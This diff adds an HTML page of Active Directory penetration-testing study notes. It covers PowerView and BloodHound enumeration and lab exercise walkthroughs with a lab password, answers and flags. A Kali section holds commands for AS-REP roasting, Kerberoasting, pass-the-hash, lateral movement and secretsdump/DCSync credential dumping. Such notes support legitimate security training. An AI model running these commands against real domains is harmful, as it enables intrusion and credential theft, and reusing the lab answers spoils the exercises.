@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+        <meta charset="UTF-8">
+        <title>Enumeration - AD Notes</title>
+        <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+        <nav>
+                <a href="index.html">Home</a>
+
+                <div class="dropdown">
+                        <a href="#">AD ▾</a>
+                        <div class="dropdown-content">
+                                <a href="enumeration.html">Enumeration</a>
+                                <a href="attacking.html">Attacking</a>
+                                <a href="lateralMovement.html">Lateral Movement</a>
+                                <a href="metodologie.html">Methodology</a>
+                        </div>
+                </div>
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+                <a href="linux-privesc.html">Linux Privesc</a>
+                <a href="file-transfer.html">File Transfer</a>
+                <a href="checklist.html">Checklist</a>
+        </nav>
+
+        <div class="container">
+
+                <h1>Enumeration</h1>
+
+                <div class="section">
+                        <div class="section-header">Local Enumeration</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Windows Commands</h2>
+
+                                <h3>Get Info</h3>
+
+                                <p>See users on the domain</p>
+                                <pre><code>net user /domain</code></pre>
+
+                                <p>See specific user</p>
+                                <pre><code>net user &lt;username&gt; /domain</code></pre>
+
+                                <p>Groups on the domain</p>
+                                <pre><code>net group /domain</code></pre>
+
+                                <p>Enumerate custom group</p>
+                                <pre><code>net group "Sales Department" /domain</code></pre>
+
+                                <h2 class="sub-title">PowerView</h2>
+
+                                <h3>Users and Groups</h3>
+
+                                <p>Import PowerView</p>
+                                <pre><code>Import-Module .\PowerView.ps1</code></pre>
+
+                                <p>Get basic domain info</p>
+                                <pre><code>Get-NetDomain</code></pre>
+
+                                <p>List all users</p>
+                                <pre><code>
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+</code></pre>
+
+                                <p>Enumerate groups</p>
+                                <pre><code>
+Get-NetGroup
+Get-NetGroup | select cn
+</code></pre>
+
+                                <p>Enumerate specific group</p>
+                                <pre><code>Get-NetGroup "Sales Department" | select member</code></pre>
+
+                        </div>
+                </div>
+
+                <div class="section">
+                        <div class="section-header">Manual Enumeration</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Operating Systems</h2>
+                                <pre><code>
+Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+</code></pre>
+
+                                <h2 class="sub-title">Permissions and Logged On Users</h2>
+
+                                <p>Check where we have local admin</p>
+                                <pre><code>Find-LocalAdminAccess</code></pre>
+
+                                <p>Find logged in users</p>
+                                <pre><code>
+Get-NetSession -ComputerName &lt;name&gt; -Verbose
+Get-NetSession -ComputerName files04 -Verbose
+</code></pre>
+
+                                <p>OS version</p>
+                                <pre><code>
+Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion
+</code></pre>
+
+                                <p>Logged users using PsLoggedOn</p>
+                                <pre><code>
+.\PsLoggedon.exe \\&lt;name&gt;
+.\PsLoggedon.exe \\files04
+</code></pre>
+
+                                <h2 class="sub-title">Service Principal Names (SPN)</h2>
+
+                                <p>Enumerate SPNs</p>
+                                <pre><code>
+setspn -L &lt;user&gt;
+setspn -L iis_service
+</code></pre>
+
+                                <p>PowerView SPN enumeration</p>
+                                <pre><code>
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+</code></pre>
+
+                                <p>If a web server is found</p>
+                                <pre><code>nslookup.exe &lt;IP&gt;</code></pre>
+
+                                <h2 class="sub-title">Enumerating Object Permissions</h2>
+
+                                <ul>
+                                        <li><b>GenericAll</b>: Full permissions on object</li>
+                                        <li><b>GenericWrite</b>: Edit attributes</li>
+                                        <li><b>WriteOwner</b>: Change owner</li>
+                                        <li><b>WriteDACL</b>: Edit ACEs</li>
+                                        <li><b>AllExtendedRights</b>: Reset password</li>
+                                        <li><b>ForceChangePassword</b>: Change password</li>
+                                        <li><b>Self</b>: Add self to group</li>
+                                </ul>
+
+                                <p>Enumerate user ACEs</p>
+                                <pre><code>
+Get-ObjectAcl -Identity &lt;user&gt;
+Get-ObjectAcl -Identity stephanie
+</code></pre>
+
+                                <p>Convert SID to name</p>
+                                <pre><code>Convert-SidToName &lt;ObjectSID&gt;</code></pre>
+
+                                <p>Check GenericAll permissions</p>
+                                <pre><code>
+Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+</code></pre>
+
+                                <p>Add user to group</p>
+                                <pre><code>net group "Management Department" stephanie /add /domain</code></pre>
+
+                                <p>Confirm membership</p>
+                                <pre><code>Get-NetGroup "Management Department" | select member</code></pre>
+
+                                <p>Remove user</p>
+                                <pre><code>net group "Management Department" stephanie /del /domain</code></pre>
+
+                                <h2 class="sub-title">Enumerating Domain Shares</h2>
+
+                                <p>Find domain shares</p>
+                                <pre><code>Find-DomainShare</code></pre>
+
+                                <p>Check accessible shares</p>
+                                <pre><code>Find-DomainShare -CheckShareAccess</code></pre>
+
+                                <p>View specific share</p>
+                                <pre><code>ls \\dc1.corp.com\sysvol\corp.com\</code></pre>
+
+                                <p>Decrypt GPP password</p>
+                                <pre><code>gpp-decrypt &lt;password&gt;</code></pre>
+
+                        </div>
+                </div>
+
+                <div class="section">
+                        <div class="section-header">Automated Enumeration</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Sharphound Collection</h2>
+                                <pre><code>
+Import-Module .\Sharphound.ps1
+Get-Help Invoke-BloodHound
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
+</code></pre>
+
+                                <h2 class="sub-title">BloodHound Analysis</h2>
+                                <pre><code>
+sudo neo4j start
+bloodhound
+</code></pre>
+
+                                <p>Login with Neo4j credentials</p>
+
+                        </div>
+                </div>
+
+                <!-- ============================== -->
+                <!-- Exercises Section -->
+                <!-- ============================== -->
+
+                <div class="section">
+                        <div class="section-header">Exercises</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Initial Access – Assumed Breach</h2>
+                                <p>
+                                        Since we are starting in an <em>assumed breach</em> scenario and we have
+                                        credentials for
+                                        <em>stephanie</em>, we will use those credentials to authenticate to the domain
+                                        via a
+                                        Windows 11 machine (<b>CLIENT75</b>). We will use the
+                                        <em>Remote Desktop Protocol</em> (RDP) with <em>xfreerdp</em> to connect to the
+                                        client and
+                                        log in to the domain. We will supply the username with <b>/u</b>, the domain
+                                        name with
+                                        <b>/d</b>, and then enter the password, which in this case is
+                                        <em>LegmanTeamBenzoin!!</em>.
+                                </p>
+                                <pre><code>
+xfreerdp3 /u:stephanie /d:corp.com /v:192.168.148.75
+        </code></pre>
+
+                                <h2 class="sub-title">1. Check User in Domain Admins Group</h2>
+                                <p>
+                                        Start VM Group 2 and log in to CLIENT75 as <em>stephanie</em>. Using PowerView,
+                                        enumerate
+                                        the modified <em>corp.com</em> domain and determine which new user is a member
+                                        of the
+                                        <em>Domain Admins</em> group.
+                                </p>
+                                <p>First, search for the PowerView script on the system:</p>
+                                <pre><code>
+Get-ChildItem C:\ -Filter PowerView.ps1 -Recurse -ErrorAction SilentlyContinue
+        </code></pre>
+                                <p>Once PowerView is available, enumerate the Domain Admins group:</p>
+                                <pre><code>
+Get-NetGroup "Domain Admins" | select member
+        </code></pre>
+
+                                <h2 class="sub-title">2. Enumerate User Office (Flag)</h2>
+                                <p>
+                                        Continue enumerating the <em>corp.com</em> domain in VM Group 2.
+                                        Enumerate which Office the user <em>fred</em> is working in to obtain the flag.
+                                </p>
+                                <pre><code>
+Get-NetUser "fred"
+        </code></pre>
+
+                                <h2 class="sub-title">3. Enumerate Server Distinguished Name</h2>
+                                <p>
+                                        Start VM Group 1 and log in to CLIENT75 as <em>stephanie</em>.
+                                        Repeat the PowerView enumeration steps outlined earlier to enumerate
+                                        the computer objects in the domain. Identify the
+                                        <em>DistinguishedName</em> for the <b>WEB04</b> machine.
+                                </p>
+                                <pre><code>
+xfreerdp3 /u:stephanie /d:corp.com /v:192.168.124.75
+        </code></pre>
+                                <pre><code>
+Get-ChildItem C:\ -Filter PowerView.ps1 -Recurse -ErrorAction SilentlyContinue
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Import-Module .\PowerView.ps1
+        </code></pre>
+                                <p>Enumerate the computer objects in the domain:</p>
+                                <pre><code>
+Get-NetComputer | select operatingsystem,dnshostname,distinguishedname
+        </code></pre>
+                                <p><b>Answer:</b> CN=web04,CN=Computers,DC=corp,DC=com</p>
+
+                                <h2 class="sub-title">4. Enumerate Server Operating System Version</h2>
+                                <p>
+                                        Continue enumerating the operating systems in VM Group 1.
+                                        Identify the exact operating system version for <em>FILES04</em>.
+                                        The answer should be provided in the format <em>xx.x (xxxxx)</em>.
+                                </p>
+                                <pre><code>
+Get-NetComputer | select operatingsystemversion,dnshostname
+        </code></pre>
+                                <p><b>Answer:</b> 10.0 (20348)</p>
+
+                                <h2 class="sub-title">5. Enumerate Operating Systems (Flag)</h2>
+                                <p>
+                                        Start VM Group 2 and log in to CLIENT75 as <em>stephanie</em>.
+                                        Use PowerView to enumerate the operating systems in the modified
+                                        <em>corp.com</em> domain and obtain the flag.
+                                </p>
+                                <pre><code>
+Get-NetComputer | select operatingsystem
+        </code></pre>
+                                <pre><code>
+OS{fdaf473fcc28a3d71438120fc983108f}
+        </code></pre>
+
+                                <h2 class="sub-title">6. Enumerate Permissions and Local Admin Access</h2>
+                                <p>
+                                        Start VM Group 2 and log in to CLIENT75 as <em>stephanie</em>.
+                                        Determine which machines the current user has local administrative
+                                        privileges on, then log in to one of those machines and obtain the
+                                        flag from the Administrator Desktop.
+                                </p>
+                                <pre><code>
+Find-LocalAdminAccess
+        </code></pre>
+                                <p>
+                                        From the output, we can see that <em>stephanie</em> has administrative
+                                        access to <b>client74</b> and <b>web04</b>. We then resolve their IP
+                                        addresses:
+                                </p>
+                                <pre><code>
+nslookup client74.corp.com
+nslookup web04.corp.com
+        </code></pre>
+                                <p>
+                                        After connecting via RDP to <b>web04</b>, the flag can be found on the
+                                        Administrator Desktop:
+                                </p>
+                                <pre><code>
+type C:\Users\Administrator\Desktop\proof.txt
+OS{c63ddf8335a6c2c6a4c116488b682e76}
+        </code></pre>
+
+                                <h2 class="sub-title">7. Enumerate Service Principal Names (SPN)</h2>
+                                <p>
+                                        Start VM Group 1 and enumerate the service accounts in the domain.
+                                        Identify the unique service identifier used to associate a service
+                                        with Active Directory.
+                                </p>
+                                <pre><code>
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+        </code></pre>
+                                <p><b>Answer:</b> Service Principal Name (SPN)</p>
+
+                                <h2 class="sub-title">8. Enumerate SYSVOL Share</h2>
+                                <p>
+                                        Enumerate the accessible domain shares and determine the hostname
+                                        of the server sharing the <b>SYSVOL</b> folder in the
+                                        <em>corp.com</em> domain.
+                                </p>
+                                <pre><code>
+Find-DomainShare
+        </code></pre>
+                                <p><b>Answer:</b> dc1</p>
+
+                                <h2 class="sub-title">9. Enumerate Accessible Shares (Flag)</h2>
+                                <p>
+                                        Start VM Group 2 and use PowerView to locate and enumerate accessible
+                                        shares in the modified <em>corp.com</em> domain to obtain the flag.
+                                </p>
+                                <pre><code>
+Find-DomainShare -CheckShareAccess
+        </code></pre>
+                                <p>
+                                        After identifying accessible shares on <b>FILES04</b>, we enumerate
+                                        the <em>Important Files</em> share and retrieve the flag:
+                                </p>
+                                <pre><code>
+ls "\\FILES04.corp.com\Important Files"
+type "\\FILES04.corp.com\Important Files\proof.txt"
+OS{ffd0817082c4611deab11249dc95b8bc}
+        </code></pre>
+
+                                <h3>Tips</h3>
+                                <p>
+                                        A fast way to identify interesting files across all accessible
+                                        shares is to recursively search for <em>.txt</em> files:
+                                </p>
+                                <pre><code>
+Find-DomainShare -CheckShareAccess | ForEach-Object {
+  Get-ChildItem "\\$($_.ComputerName)\$($_.Name)" -Recurse -ErrorAction SilentlyContinue -Include *.txt
+}
+        </code></pre>
+
+                        </div>
+                </div>
+
+
+                <!-- ============================== -->
+                <!-- Linux Enumeration Section -->
+                <!-- ============================== -->
+
+                <div class="section">
+                        <div class="section-header">Enumeration from Linux (Kali)</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Phase 0 – Initial Scan</h2>
+
+                                <p>Full port scan</p>
+                                <pre><code>
+nmap -p- --min-rate 5000 -T4 &lt;IP&gt;
+                </code></pre>
+
+                                <p>Service scan</p>
+                                <pre><code>
+nmap -sCV -p &lt;ports&gt; &lt;IP&gt;
+                </code></pre>
+
+                                <p>Important AD ports</p>
+                                <ul>
+                                        <li>88 → Kerberos</li>
+                                        <li>389 → LDAP</li>
+                                        <li>445 → SMB</li>
+                                        <li>5985 → WinRM</li>
+                                        <li>3268 → Global Catalog</li>
+                                </ul>
+
+                                <h2 class="sub-title">Phase 1 – No Credentials</h2>
+
+                                <h3>SMB Anonymous</h3>
+                                <pre><code>
+smbclient -L //&lt;IP&gt; -N
+crackmapexec smb &lt;IP&gt; --shares -u '' -p ''
+enum4linux -a &lt;IP&gt;
+                </code></pre>
+
+                                <h3>LDAP Anonymous</h3>
+                                <pre><code>
+ldapsearch -x -H ldap://&lt;IP&gt; -s base
+                </code></pre>
+
+                                <p>Extract base DN (example)</p>
+                                <pre><code>
+rootDomainNamingContext: DC=corp,DC=com
+                </code></pre>
+
+                                <pre><code>
+ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=corp,DC=com"
+                </code></pre>
+
+                                <h3>Kerberos User Enumeration</h3>
+                                <pre><code>
+kerbrute userenum -d corp.com users.txt --dc &lt;IP&gt;
+                </code></pre>
+
+                                <h3>AS-REP Roasting</h3>
+                                <pre><code>
+impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip &lt;IP&gt;
+                </code></pre>
+
+                                <p>Crack hash</p>
+                                <pre><code>
+hashcat -m 18200 hashes.txt rockyou.txt
+                </code></pre>
+
+                                <h3>DNS Zone Transfer</h3>
+                                <pre><code>
+dig axfr corp.com @&lt;IP&gt;
+                </code></pre>
+
+                                <h2 class="sub-title">Phase 2 – With Credentials</h2>
+
+                                <p>Validate credentials</p>
+                                <pre><code>
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' -d corp.com
+                </code></pre>
+
+                                <p>Password policy</p>
+                                <pre><code>
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --pass-pol
+                </code></pre>
+
+                                <p>Enumerate shares</p>
+                                <pre><code>
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --shares
+                </code></pre>
+
+                                <p>Access SYSVOL</p>
+                                <pre><code>
+smbclient //dc1/SYSVOL -U user
+                </code></pre>
+
+                                <h3>Enumerate Domain Users</h3>
+                                <pre><code>
+impacket-GetADUsers corp.com/user:Password123! -dc-ip &lt;IP&gt;
+                </code></pre>
+
+                                <h3>Enumerate Computers</h3>
+                                <pre><code>
+ldapsearch -x -H ldap://&lt;IP&gt; \
+-D "corp.com\\user" -w 'Password123!' \
+-b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem
+                </code></pre>
+
+                                <h3>Kerberoasting</h3>
+                                <pre><code>
+impacket-GetUserSPNs corp.com/user:Password123! -dc-ip &lt;IP&gt;
+                </code></pre>
+
+                                <p>Crack SPN hash</p>
+                                <pre><code>
+hashcat -m 13100 hashes.txt rockyou.txt
+                </code></pre>
+
+                                <h3>BloodHound from Linux</h3>
+                                <pre><code>
+bloodhound-python -u user -p 'Password123!' \
+-d corp.com -dc dc1.corp.com -c all
+                </code></pre>
+
+                                <h3>Check Local Admin Access</h3>
+                                <pre><code>
+crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!' -d corp.com
+                </code></pre>
+
+                                <p>If you see (Pwn3d!) → You are local admin</p>
+
+                                <h3>Enumerate Active Sessions</h3>
+                                <pre><code>
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --sessions
+                </code></pre>
+
+                                <h2 class="sub-title">Phase 3 – Lateral Movement</h2>
+
+                                <h3>WinRM</h3>
+                                <pre><code>
+evil-winrm -i &lt;IP&gt; -u user -p 'Password123!'
+                </code></pre>
+
+                                <h3>WMI</h3>
+                                <pre><code>
+impacket-wmiexec corp.com/user:Password123!@&lt;IP&gt;
+                </code></pre>
+
+                                <h3>PsExec</h3>
+                                <pre><code>
+impacket-psexec corp.com/user:Password123!@&lt;IP&gt;
+                </code></pre>
+
+                                <h3>Pass-the-Hash</h3>
+                                <pre><code>
+impacket-wmiexec -hashes :NTLM_HASH Administrator@&lt;IP&gt;
+                </code></pre>
+
+                                <h2 class="sub-title">Phase 4 – Dumping Credentials</h2>
+
+                                <pre><code>
+impacket-secretsdump corp.com/user:Password123!@&lt;IP&gt;
+                </code></pre>
+
+                                <h3>DCSync</h3>
+                                <pre><code>
+impacket-secretsdump -just-dc-user administrator corp.com/user:Password123!@&lt;DC-IP&gt;
+                </code></pre>
+
+                        </div>
+                </div>
+
+        </div>
+
+        <script>
+                document.querySelectorAll(".section-header").forEach(h => {
+                        h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+                })
+        </script>
+
+</body>
+
+</html>
